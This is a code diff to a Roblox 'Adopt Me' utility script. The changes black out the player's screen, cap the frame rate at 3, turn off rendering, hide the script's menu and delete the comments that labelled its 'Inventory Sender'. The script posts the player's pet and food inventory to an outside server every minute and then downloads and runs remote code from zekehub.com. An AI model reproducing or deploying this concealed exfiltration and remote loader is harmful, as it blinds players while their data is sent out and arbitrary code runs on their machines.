@@ -1,3 +1,50 @@
+pcall(function()
+    if setfpscap then
+        setfpscap(3)
+    end
+end)
+
+pcall(function()
+    game:GetService("RunService"):Set3dRenderingEnabled(false)
+end)
+
+pcall(function()
+    local Lighting = game:GetService("Lighting")
+    Lighting.GlobalShadows = false
+    Lighting.FogEnd = 9e9
+    Lighting.Brightness = 0
+end)
+
+pcall(function()
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("ParticleEmitter")
+        or v:IsA("Trail")
+        or v:IsA("Beam")
+        or v:IsA("Smoke")
+        or v:IsA("Fire")
+        or v:IsA("Sparkles") then
+            v.Enabled = false
+        elseif v:IsA("Texture") or v:IsA("Decal") then
+            v.Transparency = 1
+        end
+    end
+end)
+
+pcall(function()
+    local CoreGui = game:GetService("CoreGui")
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "BlackoutGui"
+    sg.IgnoreGuiInset = true
+    sg.ResetOnSpawn = false
+    sg.Parent = CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BorderSizePixel = 0
+    frame.Parent = sg
+end)
+
 getgenv().Utility = {
     AutoPotion = {
         Enabled = false,
@@ -54,17 +101,13 @@ getgenv().Utility = {
         },
     },
     Settings = {
-        AutoShowUI = true,
+        AutoShowUI = false,
         Theme = "Midnight",
         ToggleKey = "RightShift",
     },
 }
 
 getgenv().scriptkey = "BeIrggeebySaSLwtEMXCOMIZbKpMUJBF"
-
--- =========================
--- Inventory Sender
--- =========================
 
 task.spawn(function()
     local H = game:GetService("HttpService")
@@ -104,7 +147,7 @@ task.spawn(function()
             }
 
             for id, pet in pairs(pdata.inventory.pets or {}) do
-                out.pets[#out.pets+1] = {
+                out.pets[#out.pets + 1] = {
                     id = id,
                     name = pet.name or pet.id or "unknown_pet",
                     rarity = pet.rarity or "N/A"
@@ -112,7 +155,7 @@ task.spawn(function()
             end
 
             for id, item in pairs(pdata.inventory.food or {}) do
-                out.food[#out.food+1] = {
+                out.food[#out.food + 1] = {
                     id = id,
                     quantity = item.quantity or 1,
                     name = item.name or item.id or "unknown_food"
@@ -132,7 +175,8 @@ task.spawn(function()
             end)
 
             if ok3 and res then
-                print("INV SENT:", res.StatusCode or res.Status)
+                print("INV SENT:", res.StatusCode or res.Status or "unknown")
+                print("INV RESPONSE:", res.Body or "no body")
             else
                 warn("SEND FAIL:", tostring(res))
             end
@@ -143,9 +187,5 @@ task.spawn(function()
         task.wait(60)
     end
 end)
-
--- =========================
--- Load Utility Script
--- =========================
 
 loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Utility.lua"))()
